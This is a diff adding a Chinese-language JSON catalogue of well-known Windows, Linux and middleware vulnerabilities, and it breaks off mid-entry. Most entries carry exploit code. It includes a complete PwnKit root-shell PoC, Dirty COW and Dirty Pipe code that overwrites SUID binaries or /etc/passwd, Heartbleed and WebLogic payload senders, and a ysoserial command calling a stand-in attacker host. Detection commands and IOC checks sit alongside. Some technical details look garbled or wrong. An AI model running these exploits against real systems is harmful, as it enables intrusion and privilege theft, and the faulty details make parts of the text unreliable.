@@ -1,0 +1,931 @@
+[
+  {
+    "id": "",
+    "name": "Windows SMB 永恒之蓝远程代码执行（EternalBlue）",
+    "description": "SMBv1 的 SRVSVC2 内核池越界写（Type Confusion + 池布局操纵）允许未经认证在 srvnet.sys 中执行任意内核代码。WannaCry 与 NotPetya 借其全球传播，是 Windows 内网横向的标志性漏洞。",
+    "vulnType": "rce",
+    "affected": "Windows Vista/7/2008/2008 R2 未打 MS17-010 补丁；8/10/2012/2016 部分版本受影响",
+    "severity": "high",
+    "publishedAt": "2017-03-14",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2017-0144"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2017-0145"
+      }
+    ],
+    "treePath": "system-network/rce/system-network-rce-eternalblue",
+    "exploitCode": [
+      {
+        "title": "检测目标是否受影响（无漏洞利用流量）",
+        "language": "bash",
+        "code": "# 1) 探测 SMBv1 与补丁情况（nmap 脚本）\nnmap -p445 --script smb-vuln-ms17-010 target.local\n\n# 2) 手工判定：Trans2 Secondary 请求返回 STATUS_INSUFF_SERVER_RESOURCES 即可能受影响\n# 3) 确认开放与版本\nnmap -p445 --script smb-os-discovery target.local",
+        "description": "先探测后利用的判定环节，探测脚本不触发内核破坏。"
+      },
+      {
+        "title": "利用链组成说明（教学示意）",
+        "language": "text",
+        "code": "EternalBlue 利用链组成：\n1. Fingerprint：SMB 协商确认版本与架构（x86/x64）\n2. Groom：构造多个会话触发 SRVNET 池喷射，形成稳定可预测布局\n3. Exploit：Trans2 包头越界写覆盖相邻对象，写入内核 ring0 payload\n4. Payload（kernel）：修复损毁结构 -> 提权（偷 Token）-> 用户态执行后门\n\n# 公开实现：Metasploit exploit/windows/smb/ms17_010_eternalblue（经过多次稳定化）\n# 教学演示建议在隔离 VM 中进行，内核利用失败会触发目标蓝屏。",
+        "description": "四个阶段与风险说明，强调内核利用的蓝屏风险。"
+      }
+    ],
+    "prerequisites": "目标 445 端口可达且未安装 MS17-010；SMBv1 未禁用；利用失败可能导致目标蓝屏（BSOD），仅限授权环境。",
+    "references": [
+      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-0144",
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-0144"
+    ],
+    "tags": [
+      "smb",
+      "windows",
+      "eternalblue",
+      "rce",
+      "kernel"
+    ],
+    "attribution": {
+      "source": "Microsoft MSRC MS17-010 公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Windows RDP 蓝色幽灵远程代码执行（BlueKeep）",
+    "description": "RDP 通道内核态驱动 msrdp 的 Use-After-Free 允许未经认证触发远程内核代码执行，与 EternalBlue 同级别危害。可蠕虫式传播，且目标开启 NLA 时利用难度显著增加。",
+    "vulnType": "rce",
+    "affected": "Windows 7/Server 2008 R2 及更早系统未打 CVE-2019-0708 补丁（Win10 不受影响）",
+    "severity": "critical",
+    "publishedAt": "2019-05-14",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2019-0708"
+      }
+    ],
+    "treePath": "system-network/rce/system-network-rce-bluekeep",
+    "exploitCode": [
+      {
+        "title": "受影响面探测",
+        "language": "bash",
+        "code": "# 探测 RDP 是否开启与是否要求 NLA\nnmap -p3389 --script rdp-ntlm-info target.local\n\n# MSF 探测模块（只探测不利用）\n# use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\n# set RHOSTS target.local; run\n\n# 关键判定：RDP 开启 + Windows 7/2008 时代 + NLA 未启用 => 高风险",
+        "description": "BlueKeep 的风险判定以探测为主，直接利用不稳定且易蓝屏。"
+      },
+      {
+        "title": "利用链要点（教学示意）",
+        "language": "text",
+        "code": "利用链：\n1. MS_T120 通道绑定：创建多个 MS_T120 通道实例使一个被 free\n2. 通道消息触发 UAF：向已释放通道写数据获得内核控制流\n3. ring0 payload：修复 + 提权 + 用户态 shell\n\n# 公开实现：Metasploit exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n# 稳定性依赖目标架构/内存布局，成功率非 100%，失败即 BSOD。",
+        "description": "MS_T120 通道 UAF 的阶段拆解与公开实现指引。"
+      }
+    ],
+    "prerequisites": "3389 可达；目标为受影响旧系统；NLA 关闭时利用面完整；利用失败大概率蓝屏。",
+    "references": [
+      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708",
+      "https://nvd.nist.gov/vuln/detail/CVE-2019-0708"
+    ],
+    "tags": [
+      "rdp",
+      "windows",
+      "bluekeep",
+      "uaf",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Microsoft MSRC 公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Samba is_known_pipename 远程代码执行（SambaCry）",
+    "description": "Samba 3.5.0+ 的 named pipe 处理允许客户端加载任意共享路径下的动态库（pipe 名以 .. 加反斜杠组合指向可写共享）。拥有可写共享匿名或已认证权限时，上传 .so 并请求触发即可获得 smbd 权限代码执行。",
+    "vulnType": "rce",
+    "affected": "Samba 3.5.0 ~ 4.6.3 / 4.5.9 / 4.4.13（4.6.4/4.5.10/4.4.14 修复）",
+    "severity": "critical",
+    "publishedAt": "2017-05-24",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2017-7494"
+      }
+    ],
+    "treePath": "system-network/rce/system-network-rce-sambacry",
+    "exploitCode": [
+      {
+        "title": "上传 so 并经 pipe 路径触发",
+        "language": "text",
+        "code": "# 公开实现：Metasploit exploit/linux/samba/is_known_pipename\n# 步骤：\n# 1. 枚举可写共享（auxiliary/scanner/smb/smb_enumshares）\n# 2. 将 libpayload.so 上传到可写共享\n# 3. 请求 pipe 名 \"/shared/libpayload.so\" 使 smbd dlopen 加载\n# 4. so 的 init 函数执行命令（默认返回 root，因 smbd 以 root fork）",
+        "description": "可写共享上传动态库后借 pipe 名解析触发加载。"
+      }
+    ],
+    "prerequisites": "445 可达；存在匿名或已认证可写共享；Samba 版本在受影响范围；目标为 Linux Samba 服务而非 Windows。",
+    "references": [
+      "https://www.samba.org/samba/security/CVE-2017-7494.html",
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-7494"
+    ],
+    "tags": [
+      "samba",
+      "linux",
+      "sambacry",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Samba 官方安全公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Microsoft Exchange SSRF 伪造身份远程代码执行（ProxyLogon 组合链）",
+    "description": "ProxyLogon 是 CVE-2021-26855（SSRF 伪造 Kerberos 身份）与 CVE-2021-27065（后端 PowerShell 序列化任意写文件）的组合链：先利用 SSRF 访问后端 Autodiscover 拿到管理员会话，再经 OAB 虚拟目录配置写入 ASPX Webshell。",
+    "vulnType": "rce",
+    "affected": "Exchange Server 2013 / 2016 / 2019 未打 2021 年 3 月补丁（云版不受影响）",
+    "severity": "critical",
+    "publishedAt": "2021-03-02",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-26855"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2021-27065"
+      }
+    ],
+    "treePath": "system-network/rce/system-network-rce-exchange",
+    "exploitCode": [
+      {
+        "title": "SSRF 探测与后端身份伪造判定",
+        "language": "http",
+        "code": "POST /owa/auth/current/custom/scripts/autodiscover.js HTTP/1.1\nHost: target.local\nCookie: X-BEResource=attacker-pattern~1942062725\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\n# X-BEResource 值形如 <后端FQDN>~<优先级>，通过负数优先级操纵后端路由\n# 观察响应差异确认 SSRF 生效（如返回 Autodiscover XML）",
+        "description": "Cookie 指向后端资源实现服务端请求伪造的判定面。"
+      },
+      {
+        "title": "取证判定：已知 IOCs（防御视角）",
+        "language": "bash",
+        "code": "# Microsoft 官方给定的入侵痕迹检查\n# 1) CPL 日志中的 SSRF 痕迹\ngrep -E 'autodiscover|PowerShell' \"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\Logging\\\\HttpProxy\" -r | grep -i 'X-BEResource'\n\n# 2) OAB 生成日志的异常写文件\n# ECPOABGenerator 日志出现 Set-OabVirtualDirectory 外部 URL 含 \\<script 基本可判定\n# 3) Webshell 排查（wwwroot\\aspnet_client 等目录新增 aspx）",
+        "description": "已被广泛利用的漏洞附官方排查命令，防御与红队双向参考。"
+      }
+    ],
+    "prerequisites": "Exchange 本地部署未打补丁；443 可达；组合链需要先经 SSRF 拿到 CAS 会话再走 OAB 写文件。",
+    "references": [
+      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855",
+      "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
+    ],
+    "tags": [
+      "exchange",
+      "ssrf",
+      "proxylogon",
+      "rce",
+      "webshell"
+    ],
+    "attribution": {
+      "source": "Microsoft MSRC 与 MSRC 事件博客",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "OpenSSL 心跳扩展内存泄露（Heartbleed）",
+    "description": "TLS Heartbeat 扩展在实现时未校验 payload 长度与实际数据长度一致，攻击者声称 64KB 心跳却发送 1 字节，服务器返回缓冲区相邻的 64KB 内存，其中可能包含私钥、会话 Cookie 与密码。无需认证，单包读取。",
+    "vulnType": "info-disclosure",
+    "affected": "OpenSSL 1.0.1 ~ 1.0.1f（1.0.1g 修复）；1.0.2-beta 系列受影响",
+    "severity": "high",
+    "publishedAt": "2014-04-07",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2014-0160"
+      }
+    ],
+    "treePath": "system-network/info-disclosure/system-network-info-disclosure-heartbleed",
+    "exploitCode": [
+      {
+        "title": "心跳包构造读取越界内存",
+        "language": "python",
+        "code": "import socket, struct\n\n# TLS 心跳请求：type=1(request)，声称 payload_length=0x3fff（16383 字节 ≈ 64KB），实际仅携带 1 字节 'A'\npayload = b'\\x18\\x03\\x03\\x00\\x04' + b'\\x01' + b'\\x3f\\xff' + b'A'\n# 字段含义（RFC 6520）：0x18=record 内容类型(heartbeat)、0x0303=TLS1.2、0x0004=record 长度(4 字节心跳消息)、\n#           0x01=heartbeat type(request)、0x3f 0xff=payload_length(声称读取的 16383 字节)、'A'=实际携带的 1 字节 payload\n\ns = socket.create_connection(('target.local', 443), timeout=5)\n# 省略握手细节：先发 ClientHello（可用 scapy/ssl 库代构造），随后发送心跳\ns.sendall(payload)\nresp = s.recv(65535)\nprint('leaked bytes:', len(resp) - 3 - 2)\nopen('leak.bin', 'wb').write(resp)\n\n# nmap 检测：nmap -p443 --script ssl-heartbleed target.local",
+        "description": "心跳长度字段欺骗导致相邻内存回传，附标准检测脚本。"
+      }
+    ],
+    "prerequisites": "目标启用受影响 OpenSSL 版本且开放 TLS 心跳；443 或其他 TLS 端口可达。",
+    "references": [
+      "https://openssl-library.org/news/secadv/20140407.txt",
+      "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"
+    ],
+    "tags": [
+      "openssl",
+      "tls",
+      "heartbleed",
+      "info-disclosure"
+    ],
+    "attribution": {
+      "source": "OpenSSL 官方安全公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Windows SMB 压缩整数溢出远程代码执行（SMBGhost）",
+    "description": "SMBv3.1.1 压缩消息的 Offset 字段经 0xFFFF 组合产生整数溢出，导致内核 memcpy 越界写。未认证单包即可利用，Win10 1903/1909 上有公开的稳定内核 RCE 链（也可用于本地提权）。",
+    "vulnType": "memory-corruption",
+    "affected": "Windows 10 1903/1909、Windows Server 版本 1903/1909（半年度通道）未打 CVE-2020-0796 补丁",
+    "severity": "critical",
+    "publishedAt": "2020-03-10",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2020-0796"
+      }
+    ],
+    "treePath": "system-network/memory-corruption/system-network-memory-corruption-smbghost",
+    "exploitCode": [
+      {
+        "title": "SMB v3 压缩支持探测",
+        "language": "bash",
+        "code": "# 判定 SMBv3.1.1 + 压缩能力（受影响必要条件）\nnmap -p445 --script smb-protocols target.local | grep -E '3.1.1|compression'\n\n# Python 构造 NEGOTIATE 探测包：响应 CompressionCapabilities 字段非 0 即支持压缩\n# 公开探测脚本参考（SMBGhost scanner，含尚未利用的崩溃探测）：https://github.com/ambionics/cve-2020-0796-scanner",
+        "description": "受影响判定的探测路径，远程利用相关公开代码以崩溃型探测为主。"
+      },
+      {
+        "title": "利用面说明（本地提权视角）",
+        "language": "text",
+        "code": "CVE-2020-0796 双面利用：\n- 远程未认证 RCE：需要精确内核池布局，公开 PoC 曾以蓝屏探测为主\n- 本地提权：smbserver 内核会话已验证稳定的公开链（GitHub 多个公开实现）\n\n机制：srv2!Srv2DecompressData 对 CompressionTransformHeader 的\nOriginalSize + Offset 做加法未校验溢出，memcpy 写入用户控制数据。",
+        "description": "溢出机理与远程/本地两条利用面的差异说明。"
+      }
+    ],
+    "prerequisites": "目标 SMBv3.1.1 启用压缩且未打补丁；445 可达（远程面）；本地面需拥有低权限会话。",
+    "references": [
+      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796",
+      "https://nvd.nist.gov/vuln/detail/CVE-2020-0796"
+    ],
+    "tags": [
+      "smb",
+      "smbghost",
+      "integer-overflow",
+      "rce",
+      "lpe"
+    ],
+    "attribution": {
+      "source": "Microsoft MSRC 公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Linux 内核 COW 缺陷页写提权（Dirty COW）",
+    "description": "内核内存子系统在 COW（copy-on-write）处理上的竞态缺陷（get_user_pages 与 madvise 竞争）允许低权限用户写入只读映射的文件，最经典利用是改写 root 可执行文件的 /usr/bin/passwd 自身内容获得 root。",
+    "vulnType": "lpe",
+    "affected": "Linux kernel >= 2.6.22（2007 年起）~ 4.8.3 / 4.7.9 / 4.4.26（2016-10 修复）",
+    "severity": "high",
+    "publishedAt": "2016-10-19",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2016-5195"
+      }
+    ],
+    "treePath": "privilege-escalation/lpe/privilege-escalation-lpe-dirtycow",
+    "exploitCode": [
+      {
+        "title": "madvise 竞态写 SUID 文件",
+        "language": "c",
+        "code": "// 经典 PoC 骨架（dirtycow / cowroot 公开实现的简化示意）\n// 打开只读 SUID 文件，用 MAP_PRIVATE 映射，两个线程竞争：\n#include <fcntl.h>\n#include <pthread.h>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <unistd.h>\n\nvoid *map;\nvoid *write_thread(void *arg) {\n    int f = open(\"/proc/self/mem\", O_RDWR);\n    for (;;) {\n        lseek(f, (off_t)(map + 0x4), SEEK_SET);   // 目标文件偏移（如 SUID 二进制）\n        write(f, \"/bin/sh\", 7);                    // 覆盖为目标串（字节 0x2f 0x62 ...）\n    }\n}\nvoid *madv_thread(void *arg) {\n    for (;;) madvise(map, 0x1000, MADV_DONTNEED);  // 丢弃 COW 页触发重读\n}\n\nint main() {\n    int fd = open(\"/usr/bin/passwd\", O_RDONLY);\n    map = mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);\n    pthread_t t1, t2;\n    pthread_create(&t1, NULL, write_thread, NULL);\n    pthread_create(&t2, NULL, madv_thread, NULL);\n    pthread_join(t1, NULL);\n    pthread_join(t2, NULL);\n    return 0;\n}\n// 竞态成功后 /usr/bin/passwd 的某调用被替换，执行即 root。",
+        "description": "写线程 + madvise 线程竞态的核心 PoC 结构。"
+      }
+    ],
+    "prerequisites": "本地低权限 shell；内核版本在受影响范围且未打补丁；文件系统非只读覆盖保护（如利用 dirty_writeback 变体绕过只读文件限制）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2016-5195",
+      "https://github.com/dirtycow/dirtycow.github.io"
+    ],
+    "tags": [
+      "linux",
+      "kernel",
+      "dirtycow",
+      "lpe",
+      "race-condition"
+    ],
+    "attribution": {
+      "source": "dirtycow.github.io 公开 PoC 集合与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Linux 内核 pipe_buffer 结构未初始化提权（Dirty Pipe）",
+    "description": "pipe 缓冲区标志位在 splice 管道未初始化清零，允许将 PIPE_BUF_FLAG_CAN_MERGE 标志写入只读文件页缓存：向 pipe 写数据再 splice 指向只读文件偏移，覆盖页缓存实现任意文件内容改写，直接改 /etc/passwd 的 root 哈希提权。比 Dirty COW 更稳定，无竞态。",
+    "vulnType": "lpe",
+    "affected": "Linux kernel 5.8 ~ 5.16.11 / 5.15.25 / 5.10.102（2022-02 修复）",
+    "severity": "high",
+    "publishedAt": "2022-03-07",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-0847"
+      }
+    ],
+    "treePath": "privilege-escalation/lpe/privilege-escalation-lpe-dirtypipe",
+    "exploitCode": [
+      {
+        "title": "页缓存覆盖改写 /etc/passwd",
+        "language": "c",
+        "code": "// 关键步骤（完整 PoC 见参考链接，此处呈现可读主链）：\n// 1) 创建 pipe 并写满再排空，使 pipe_buffer 标志残留未清零\nint fds[2]; pipe(fds);\nconst unsigned pipe_size = fcntl(fds[1], F_GETPIPE_SZ);\nstatic char buffer[4096];\nwrite(fds[1], buffer, pipe_size);\nread(fds[0], buffer, pipe_size);\n\n// 2) splice 只读文件 1 字节到 pipe —— pipe_buffer->flags 被置 CAN_MERGE\nloff_t offset = 1; // /etc/passwd 中 root 行 x 的偏移\nsplice(passwd_fd, &offset, fds[1], NULL, 1, 0);\n\n// 3) 向 pipe 写入覆盖数据，直接写入页缓存\nwrite(fds[1], \"root:$6$攻击者哈希$:0:0:root:/root:/bin/bash\", len);\n\n// 4) su root 使用新哈希登录；修改仅存于页缓存，重启后还原（隐蔽性好）",
+        "description": "无需竞态的四步稳定覆盖链，附隐蔽性说明。"
+      }
+    ],
+    "prerequisites": "本地低权限 shell；内核 5.8 ~ 5.16.11 区间；目标文件可读且需知道覆盖偏移（/etc/passwd 场景固定）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-0847",
+      "https://dirtypipe.cm4all.com/"
+    ],
+    "tags": [
+      "linux",
+      "kernel",
+      "dirtypipe",
+      "lpe",
+      "page-cache"
+    ],
+    "attribution": {
+      "source": "漏洞发现者公开技术分析与 NVD",
+      "author": "Max Kellermann",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "polkit pkexec 环境变量注入提权（PwnKit）",
+    "description": "pkexec 处理调用者环境变量时缺少安全过滤，可注入 GCONV_PATH 使其加载攻击者控制的字符集转换模块，以 root 身份执行任意代码。2009 年引入的缺陷，几乎所有主流发行版默认受影响，且利用稳定无需竞态。",
+    "vulnType": "lpe",
+    "affected": "polkit 0.105 ~ 0.120（各发行版 2022-01 补丁前默认版本）",
+    "severity": "high",
+    "publishedAt": "2022-01-25",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-4034"
+      }
+    ],
+    "treePath": "privilege-escalation/lpe/privilege-escalation-lpe-pwnkit",
+    "exploitCode": [
+      {
+        "title": "GCONV_PATH 环境变量注入",
+        "language": "bash",
+        "code": "# 公开 PoC 流程（ONE_SENTENCE 原理：pkexec argv[0] 为空引发错误路径读取环境变量）\nmkdir -p 'GCONV_PATH=.'\ncp /usr/bin/true 'GCONV_PATH=./pwnkit.so'\nmkdir -p pwnkit\ncat > pwnkit/gconv-modules <<'EOF'\nmodule UTF-8// PWNKIT// pwnkit 1\nEOF\ncat > pwnkit/pwnkit.so.c <<'EOF'\n#include <stdio.h>\n#include <stdlib.h>\nvoid gconv(void) {}\nvoid gconv_init(void *step) {\n    setuid(0); setgid(0);\n    char *cmd[] = {\"/bin/sh\", 0};\n    execve(cmd[0], cmd, 0);\n    _exit(0);\n}\nEOF\ngcc -shared -fPIC -o pwnkit/pwnkit.so pwnkit/pwnkit.so.c\nenv -i 'GCONV_PATH=.' LC_CTYPE=C.UTF-8 pkexec --version\n# 执行后获得 root shell；修复版本 pkexec 移除了环境变量透传。",
+        "description": "环境变量注入 + gconv 模块加载的完整可复现 PoC。"
+      }
+    ],
+    "prerequisites": "本地低权限 shell；/usr/bin/pkexec 存在且 SUID（绝大多数发行版默认）；polkit 未打补丁。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-4034",
+      "https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt"
+    ],
+    "tags": [
+      "polkit",
+      "pkexec",
+      "pwnkit",
+      "lpe"
+    ],
+    "attribution": {
+      "source": "Qualys 官方漏洞报告与 NVD",
+      "author": "Qualys Research Team",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "sudo 堆溢出提权（Baron Samedit）",
+    "description": "sudo 解析命令行参数中的反斜杠转义时（shell 模式），-s 与 -i 选项对用户可控串做堆写越界。任何本地用户（甚至在 sudoers 中列为不可用的用户）以 sudoedit -s 反斜杠开头的参数即可触发，获得 root。",
+    "vulnType": "lpe",
+    "affected": "sudo 1.8.2 ~ 1.8.31p2、1.9.0 ~ 1.9.5p1（2021-01 补丁前）",
+    "severity": "high",
+    "publishedAt": "2021-01-26",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-3156"
+      }
+    ],
+    "treePath": "privilege-escalation/lpe/privilege-escalation-lpe-sudo-baron-samedit",
+    "exploitCode": [
+      {
+        "title": "漏洞存在性快速判定",
+        "language": "bash",
+        "code": "# 判定命令（受影响版本返回 Segmentation fault 或 heap 错误）：\nsudoedit -s '\\'$(python3 -c 'print(\"A\"*1000)')\n\n# 或按官方 PoC 集：\nsu - nobody -s /bin/bash -c 'sudoedit -s \\'AAAA...'  # nobody 也能触发即确认\n\n# 检查版本：sudo --version | head -1",
+        "description": "一条命令判定受影响，无需完整利用链。"
+      },
+      {
+        "title": "堆溢出提权 PoC 结构（教学示意）",
+        "language": "python",
+        "code": "# 公开 PoC（GitHub stong如何 CVE-2021-3156/多套实现）核心：\n# 1) 以大量 'A\\' 转义对填充 sudoedit 参数，触发 set_cmnd 的 strcpy 越界\n# 2) 越界写入用户构造的 overlay：将伪造的 envp 指向预设结构\n# 3) 覆盖目标为 /etc/shadow root 哈希或直接 execve(\"/bin/sh\")（不同实现）\n#\n# 骨架：\n# args = ['-s', 'A\\' + b'\\\\' * 0x400 + payload_bytes]\n# os.execv('/usr/bin/sudoedit', ['sudoedit'] + args)\n# 不同 glibc/sudo 版本需要调 offset，公开仓库给了 10+ 版本的偏移表。",
+        "description": "堆布局与偏移适配思路，附公开实现定位。"
+      }
+    ],
+    "prerequisites": "本地任意低权限账户；sudo 版本在受影响范围；无需 sudoers 条目（正是该漏洞的要点）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-3156",
+      "https://www.sudo.ws/alerts/unescape_overflow.html"
+    ],
+    "tags": [
+      "sudo",
+      "heap-overflow",
+      "baron-samedit",
+      "lpe"
+    ],
+    "attribution": {
+      "source": "sudo 官方安全公告与 Qualys 报告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Linux 内核 Netfilter 堆越界写提权",
+    "description": "netfilter x_tables 的 setsockopt IP6T_SO_SET_REPLACE 在 translate_compat_table 中存在堆越界写，利用 heap OOB 将对象指针替换为内核地址实现任意读写，完成 root 提权。与 iovec/MSG_MSG 类内核堆利用同族，公开链稳定。",
+    "vulnType": "lpe",
+    "affected": "Linux kernel 5.2 ~ 5.16.10 / 5.15.24 / 5.10.101（2022-02 修复）",
+    "severity": "high",
+    "publishedAt": "2022-01-27",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-22555"
+      }
+    ],
+    "treePath": "privilege-escalation/lpe/privilege-escalation-lpe-netfilter-oob",
+    "exploitCode": [
+      {
+        "title": "Netfilter OOB 利用主链（教学示意）",
+        "language": "c",
+        "code": "// 公开 PoC（github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555）主链：\n// 1) setsockopt(NFNL_SUBSYS_NETFILTER, IP6T_SO_SET_REPLACE, ...) 触发\n//    translate_compat_table 中的写越界（目标计数差一）\n// 2) 越界清除相邻 tpacket_req 对象的标志位，结合 setsockopt packet ring\n//    获得 UAF 页\n// 3) 喷射 msg_msg 对象占位，用 OOB 修改 msg_msg->m_ts 实现越界读\n// 4) 泄露内核基址与 cred 结构后，改写自身 cred->uid/gid 为 0 完成 root\n//\n// 代码骨架为 setsockopt 触发 + pipe/msg 堆喷射组合，完整可运行 PoC 见参考。",
+        "description": "四阶段利用链组成，完整 PoC 在 Google security-research 仓库。"
+      }
+    ],
+    "prerequisites": "本地低权限 shell；内核 5.2 ~ 5.16.10 区间；CONFIG_USER_NS 或相应 netfilter 模块可用（unshare 场景）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-22555",
+      "https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555"
+    ],
+    "tags": [
+      "linux",
+      "kernel",
+      "netfilter",
+      "heap-oob",
+      "lpe"
+    ],
+    "attribution": {
+      "source": "Google Security Research 公开 PoC 与 NVD",
+      "author": "Google Security Research",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "WebLogic T3 协议反序列化远程代码执行",
+    "description": "WebLogic 开放的 T3 协议传输 Java 序列化对象，黑名单反序列化策略多次被绕过。发送构造的序列化对象到 T3 端口配合 CommonsCollections 等 Gadget 即可 RCE，是中间件反序列化的代表。",
+    "vulnType": "deserialization",
+    "affected": "Oracle WebLogic Server 10.3.6 / 12.1.x / 12.2.x 多个版本（按 2015-4852 与后续补丁状态）",
+    "severity": "critical",
+    "publishedAt": "2015-10",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2015-4852"
+      }
+    ],
+    "treePath": "middleware/deserialization/middleware-deserialization-weblogic",
+    "exploitCode": [
+      {
+        "title": "T3 协议发送序列化载荷",
+        "language": "python",
+        "code": "# 结构：T3 握手后把 payload 混入 sendObject 流\nimport socket\n\nsock = socket.create_connection(('target.local', 7001), timeout=8)\n# 1) 握手\nsock.sendall(b't3 12.2.1\\nAS:2048\\nHL:19\\n\\n')\nprint(sock.recv(1024))\n# 2) 序列化头 + Gadget 数据（ysoserial 生成 CC6/CC1 对应版本）\nheader = bytes.fromhex('000005') + b'\\x01\\x65\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60'\npayload = open('payload.bin', 'rb').read()  # java -jar ysoserial.jar CommonsCollections6 'cmd'\nsock.sendall(header + payload)\nprint(sock.recv(4096))\n\n# 触发成功与否可结合延时/外带判断；新版补丁需配合 JRMP 反序列化二次链。",
+        "description": "T3 握手与序列化数据拼接的通用结构。"
+      }
+    ],
+    "prerequisites": "7001（T3）端口可达；WebLogic 未打对应季度补丁；目标 classpath 存在可用 Gadget 依赖（WebLogic 自带部分依赖即够用）。",
+    "references": [
+      "https://www.oracle.com/security-alerts/cpuoct2015.html",
+      "https://nvd.nist.gov/vuln/detail/CVE-2015-4852"
+    ],
+    "tags": [
+      "weblogic",
+      "t3",
+      "deserialization",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Oracle CPU 公告与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "JBoss JBossMQ JMS 反序列化远程代码执行",
+    "description": "JBoss AS 5/6 的 JBossMQ JMS 层 HTTP 接口（/invoker/JMSServerConfiguratorServlet 等 invoker Servlet）直接反序列化 POST 体，无认证。发送 ysoserial 载荷即可执行命令，invoker 目录暴露即受影响。",
+    "vulnType": "deserialization",
+    "affected": "JBoss AS 5.x / 6.x（含 JBossMQ）；EAP 4/5 受影响版本",
+    "severity": "critical",
+    "publishedAt": "2017-08",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2017-12149"
+      }
+    ],
+    "treePath": "middleware/deserialization/middleware-deserialization-jboss",
+    "exploitCode": [
+      {
+        "title": "invoker Servlet 反序列化探测与利用",
+        "language": "http",
+        "code": "POST /invoker/JMSServerConfiguratorServlet HTTP/1.1\nHost: target.local:8080\nContent-Type: application/x-www-form-urlencoded\n\n<ysoserial CommonsCollections5 序列化字节流>\n\n# 判定：/invoker/JMXInvokerServlet 返回 200 且为二进制即存在反序列化面\n# 载荷生成：java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.local/confirm'",
+        "description": "invoker 路径直接消费 POST 序列化数据。"
+      }
+    ],
+    "prerequisites": "8080 可达且 /invoker/* 未删除；JBoss 版本受影响；Gadget 与目标 JDK/依赖匹配。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-12149",
+      "https://access.redhat.com/security/cve/cve-2017-12149"
+    ],
+    "tags": [
+      "jboss",
+      "deserialization",
+      "invoker",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Red Hat 官方 CVE 页面与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Jenkins CLI 反序列化远程代码执行",
+    "description": "Jenkins CLI 经 Java 序列化通信，旧版本的处理通道直接反序列化任意对象。构造 InvokerTransformer 链发送到 CLI 端口即可 RCE，无需任何凭据，历史上被大规模挖矿团伙利用。",
+    "vulnType": "deserialization",
+    "affected": "Jenkins main < 2.32.2（LTS < 2.19.3），及 CVE-2016-0792 相关通道",
+    "severity": "critical",
+    "publishedAt": "2016-02-24",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2015-8103"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2016-0792"
+      }
+    ],
+    "treePath": "middleware/deserialization/middleware-deserialization-jenkins-cli",
+    "exploitCode": [
+      {
